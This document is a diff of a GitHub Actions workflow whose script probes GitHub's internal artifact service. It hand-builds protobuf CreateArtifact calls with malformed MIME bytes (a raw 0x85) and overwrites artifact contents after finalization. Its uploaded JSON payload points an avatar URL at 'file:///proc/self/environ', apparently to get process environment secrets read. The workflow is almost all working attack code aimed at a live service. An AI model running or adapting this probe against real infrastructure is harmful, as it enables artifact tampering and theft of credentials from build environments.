@@ -1,4 +1,4 @@
-name: Probe artifact name byte-boundary collisions
+name: Probe raw non-UTF8 artifact MIME bytes
 on:
   workflow_dispatch:
   push:
@@ -11,7 +11,7 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
       - uses: actions/github-script@v8
         env:
@@ -29,80 +29,65 @@ jobs:
             const [, runId, jobId] = scope.split(':');
             const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
             const base = new URL(results).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
-            const placeholder = Buffer.from('{"probe":"artifact-name-boundary"}');
-            const weird = 'application/json\u0085';
-            const safe = 'application/json';
-            async function rpc(method, document) {
-              const response = await fetch(base + method, {method: 'POST', headers: {Authorization: `Bearer ${runtime}`, 'Content-Type': 'application/json'}, body: JSON.stringify(document)});
-              const text = await response.text();
-              let data = {}; try { data = JSON.parse(text); } catch {}
-              return {status: response.status, data, text};
+            function varint(value) {
+              const out=[];
+              do { let b=value&0x7f; value >>>= 7; if(value)b|=0x80; out.push(b); } while(value);
+              return Buffer.from(out);
             }
-            async function create(name, version, mime) {
-              const r = await rpc('CreateArtifact', {...ids, name, version, mime_type: mime});
-              if (!r.data?.ok || !r.data?.signed_upload_url) throw new Error(`CREATE ${r.status}: ${String(r.data?.msg || r.text).slice(0,100)}`);
-              return {name, version, mime, uploadUrl: r.data.signed_upload_url, pathHash: crypto.createHash('sha256').update(new URL(r.data.signed_upload_url).pathname).digest('hex').slice(0,16)};
+            function bytesField(field, bytes) { return Buffer.concat([varint(field*8+2),varint(bytes.length),bytes]); }
+            function stringValue(bytes) { return bytesField(1,bytes); }
+            function createBody(name,mimeBytes) {
+              return Buffer.concat([
+                bytesField(1,Buffer.from(runId)), bytesField(2,Buffer.from(jobId)),
+                bytesField(3,Buffer.from(name)), varint(5*8), varint(7),
+                bytesField(6,stringValue(mimeBytes)),
+              ]);
             }
-            async function put(url, body, mime) {
-              const r = await fetch(url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': mime, 'x-ms-version': '2023-11-03', 'Content-Type': 'application/octet-stream'}, body});
-              await r.arrayBuffer();
-              if (!r.ok) throw new Error(`UPLOAD ${r.status}`);
+            function readVarint(buf,state) {
+              let value=0,shift=0;
+              while(state.pos<buf.length){const b=buf[state.pos++];value+=(b&0x7f)*2**shift;if(!(b&0x80))return value;shift+=7;}
+              throw new Error('truncated protobuf response');
             }
-            async function finalize(item) {
-              const hash = 'sha256:' + crypto.createHash('sha256').update(placeholder).digest('hex');
-              const r = await rpc('FinalizeArtifact', {...ids, name: item.name, size: String(placeholder.length), hash});
-              const id = String(r.data?.artifact_id || r.data?.artifactId || '');
-              if (!r.data?.ok || !/^\d+$/.test(id)) throw new Error(`FINALIZE ${r.status}: ${String(r.data?.msg || r.text).slice(0,100)}`);
-              return {...item, id};
+            function decodeCreate(buf,contentType) {
+              if(contentType.includes('json')) { const v=JSON.parse(buf.toString('utf8')); return {ok:v.ok===true,url:v.signed_upload_url||v.signedUploadUrl,msg:String(v.msg||v.code||'').slice(0,120)}; }
+              const state={pos:0}; let ok=false,url='';
+              while(state.pos<buf.length){const tag=readVarint(buf,state),field=Math.floor(tag/8),wire=tag%8;if(wire===0){const value=readVarint(buf,state);if(field===1)ok=value!==0;}else if(wire===2){const n=readVarint(buf,state),v=buf.subarray(state.pos,state.pos+n);state.pos+=n;if(field===2)url=v.toString('utf8');}else throw new Error(`unexpected response wire ${wire}`);}
+              return {ok,url,msg:''};
             }
-            async function inspect(item) {
-              const payload = Buffer.from(JSON.stringify({full_name: `${repo}/actions/artifacts/${item.id}/zip`, owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'}, description: 'name-boundary verification', stargazers_count: 0}));
-              await put(item.uploadUrl, payload, item.mime);
-              const response = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${item.id}/zip`, {redirect: 'manual', headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json'}});
-              const location = response.headers.get('location');
-              const rsct = location ? new URL(location).searchParams.get('rsct') : null;
-              let type = '', length = -1, fullNameMatch = false, bodyHash = '';
-              if (location) {
-                const final = await fetch(location);
-                type = final.headers.get('content-type') || '';
-                const body = Buffer.from(await final.arrayBuffer());
-                length = body.length;
-                bodyHash = crypto.createHash('sha256').update(body).digest('hex').slice(0,16);
-                try { fullNameMatch = JSON.parse(body.toString('utf8')).full_name === `${repo}/actions/artifacts/${item.id}/zip`; } catch {}
-              }
-              return {id: item.id, version: item.version, nameBytes: Buffer.byteLength(item.name), pathHash: item.pathHash, restStatus: response.status, rsct, typeHex: Buffer.from(type).toString('hex'), length, fullNameMatch, bodyHash};
+            async function jsonRpc(method,document) {
+              const response=await fetch(base+method,{method:'POST',headers:{Authorization:`Bearer ${runtime}`,'Content-Type':'application/json'},body:JSON.stringify(document)});
+              const text=await response.text();let data={};try{data=JSON.parse(text);}catch{}
+              return {status:response.status,data,text};
             }
-            function asciiPrefix(targetBytes, label) {
-              const start = `name-${runId}-${label}-`;
-              return start + 'a'.repeat(Math.max(0, targetBytes - Buffer.byteLength(start)));
+            async function put(url,body) {
+              const response=await fetch(url,{method:'PUT',headers:{'x-ms-blob-type':'BlockBlob','x-ms-version':'2023-11-03','x-ms-blob-content-type':'application/json','Content-Type':'application/octet-stream'},body});
+              await response.arrayBuffer(); return response.status;
             }
-            function utf8Prefix(targetBytes, label, character) {
-              let prefix = `name-${runId}-${label}-`;
-              while (Buffer.byteLength(prefix + character) <= targetBytes) prefix += character;
-              return prefix + 'a'.repeat(targetBytes - Buffer.byteLength(prefix));
+            async function test(label,mimeBytes) {
+              const name=`raw-mime-${runId}-${label}`;
+              const response=await fetch(base+'CreateArtifact',{method:'POST',headers:{Authorization:`Bearer ${runtime}`,'Content-Type':'application/protobuf'},body:createBody(name,mimeBytes)});
+              const responseBytes=Buffer.from(await response.arrayBuffer());
+              let created;
+              try{created=decodeCreate(responseBytes,response.headers.get('content-type')||'');}
+              catch(error){console.log(`RAWBYTE ${JSON.stringify({label,stage:'decode',status:response.status,error:String(error.message).slice(0,120)})}`);return;}
+              if(response.status!==200||!created.ok||!created.url){console.log(`RAWBYTE ${JSON.stringify({label,stage:'create',status:response.status,ok:created.ok,msg:created.msg,responseHex:responseBytes.subarray(0,100).toString('hex')})}`);return;}
+              const placeholder=Buffer.from('{"probe":"raw-mime-byte"}');
+              const firstPut=await put(created.url,placeholder);
+              if(firstPut!==201){console.log(`RAWBYTE ${JSON.stringify({label,stage:'upload',status:firstPut})}`);return;}
+              const digest='sha256:'+crypto.createHash('sha256').update(placeholder).digest('hex');
+              const finalized=await jsonRpc('FinalizeArtifact',{...ids,name,size:String(placeholder.length),hash:digest});
+              const id=String(finalized.data.artifact_id||finalized.data.artifactId||'');
+              if(finalized.status!==200||finalized.data.ok!==true||!/^\d+$/.test(id)){console.log(`RAWBYTE ${JSON.stringify({label,stage:'finalize',status:finalized.status,ok:finalized.data.ok})}`);return;}
+              const payload=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'raw MIME byte probe',stargazers_count:0}));
+              const overwrite=await put(created.url,payload);
+              const rest=await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,{redirect:'manual',headers:{Authorization:`Bearer ${process.env.GH_TOKEN}`,Accept:'application/vnd.github.v3+json'}});
+              const location=rest.headers.get('location');
+              let finalStatus=0,type='',body=Buffer.alloc(0),rsct='';
+              if(location){const url=new URL(location);rsct=url.searchParams.get('rsct')||'';const final=await fetch(location);finalStatus=final.status;type=final.headers.get('content-type')||'';body=Buffer.from(await final.arrayBuffer());}
+              const part=type.split(',',1)[0].split(';',1)[0];
+              const python=part.replace(/^[\s\x1c-\x1f\x85]+|[\s\x1c-\x1f\x85]+$/gu,'').toLowerCase();
+              const node=part.trim().toLowerCase();
+              console.log(`RAWBYTE ${JSON.stringify({label,createStatus:response.status,artifactId:id,overwrite,restStatus:rest.status,finalStatus,rsctUtf8Hex:Buffer.from(rsct,'utf8').toString('hex'),typeCodepoints:[...type].map(c=>c.codePointAt(0).toString(16)),typeLatin1Hex:Buffer.from(type,'latin1').toString('hex'),typeUtf8Hex:Buffer.from(type,'utf8').toString('hex'),nodeType:node,pythonType:python,bodyLength:body.length,bodyExact:body.equals(payload),fullNameMatch:(()=>{try{return JSON.parse(body.toString('utf8')).full_name===`${repo}/actions/artifacts/${id}/zip`}catch{return false}})()})}`);
             }
-            const cases = [];
-            for (const size of [255, 256, 257, 299]) cases.push({label: `ascii-${size}`, size, kind: 'ascii'});
-            for (const [label, ch] of [['utf8-eacute', 'é'], ['utf8-astral', '𝄞']]) {
-              for (const size of [255,256]) cases.push({label: `${label}-${size}`, size, kind: 'utf8', character: ch});
-            }
-            for (const test of cases) {
-              for (let reverse = 0; reverse < 2; reverse++) {
-                const prefixLabel = `${test.label}-r${reverse}`;
-                const prefix = test.kind === 'ascii'
-                  ? asciiPrefix(test.size, prefixLabel)
-                  : utf8Prefix(test.size, prefixLabel, test.character);
-                const nameX = prefix + 'X';
-                const nameY = prefix + 'Y';
-                const pair = reverse ? [[nameY,7,safe],[nameX,6,weird]] : [[nameX,6,weird],[nameY,7,safe]];
-                try {
-                  const created = await Promise.all(pair.map(([name,version,mime]) => create(name,version,mime)));
-                  await Promise.all(created.map(item => put(item.uploadUrl, placeholder, item.mime)));
-                  const finalized = await Promise.all(created.map(finalize));
-                  const results = await Promise.all(finalized.map(inspect));
-                  console.log(`BOUNDARY ${JSON.stringify({label:test.label, reverse, chars:pair.map(x=>x[0].length), bytes:pair.map(x=>Buffer.byteLength(x[0])), sameStoragePath:created[0].pathHash===created[1].pathHash, sameId:finalized[0].id===finalized[1].id, results})}`);
-                } catch (error) {
-                  console.log(`BOUNDARY_ERROR ${JSON.stringify({label:test.label, reverse, error:String(error.message).slice(0,180)})}`);
-                }
-              }
-            }
+            await test('tail-raw-85',Buffer.concat([Buffer.from('application/json'),Buffer.from([0x85])]));
+            await test('prefix-raw-85',Buffer.concat([Buffer.from([0x85]),Buffer.from('application/json')]));
